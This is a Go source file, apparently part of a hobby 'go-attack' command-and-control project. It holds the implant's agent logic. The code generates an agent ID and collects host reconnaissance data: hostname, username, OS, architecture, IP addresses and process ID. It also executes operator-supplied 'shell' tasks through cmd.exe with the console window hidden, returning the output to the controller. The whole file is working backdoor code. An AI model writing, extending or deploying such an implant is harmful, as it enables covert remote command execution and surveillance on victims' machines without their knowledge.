package internal

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/ianwong123/go-attack/c2/protocol"
)

type Info struct {
	AgentID  string
	Hostname string
	Username string
	OS       string
	Arch     string
	IPs      []string
	PID      int
}

// Generate user-agent ID
func GenerateID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		log.Fatalf("failed to generate agent id: %v", err)
	}

	return hex.EncodeToString(b)
}

// Collect system information
func Collect() Info {
	info := Info{
		OS:   runtime.GOOS,
		Arch: runtime.GOARCH,
		PID:  os.Getpid(),
	}

	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	}

	if u, err := user.Current(); err == nil {
		info.Username = u.Username
	} else {
		info.Username = os.Getenv("USER")
	}
	info.IPs = collectIps()
	return info
}

// collect IPs
func collectIps() []string {
	var ips []string
	i, err := net.Interfaces()
	if err != nil {
		return ips
	}
	for _, ip := range i {
		addrs, err := ip.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.IsLoopback() {
					continue
				}
				if ipnet.IP.To4() != nil {
					ips = append(ips, ipnet.IP.String())
				}
			}
		}
	}
	return ips
}

// execute and run task
func Run(task *protocol.Task) *protocol.Result {
	switch task.Command {
	case "shell":
		return runShell(task)
	case "sleep":
		return &protocol.Result{TaskID: task.TaskID, Output: "sleeping", Success: true}
	default:
		return &protocol.Result{TaskID: task.TaskID, Output: "unknown command" + task.Command, Success: false}
	}
}

func runShell(task *protocol.Task) *protocol.Result {
	parts := strings.Fields(task.Args)
	if len(parts) == 0 {
		return &protocol.Result{TaskID: task.TaskID, Output: "no args", Success: false}
	}
	// catch output
	var stdout, stderr bytes.Buffer
	cmd := exec.Command("cmd.exe", append([]string{"/C"}, parts...)...)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	hideWindow(cmd)
	err := cmd.Run()
	output := stdout.String()
	if stderr.Len() > 0 {
		output += "\nSTDERR: " + stderr.String()
	}
	return &protocol.Result{
		TaskID:  task.TaskID,
		Output:  output,
		Success: err == nil,
	}
}
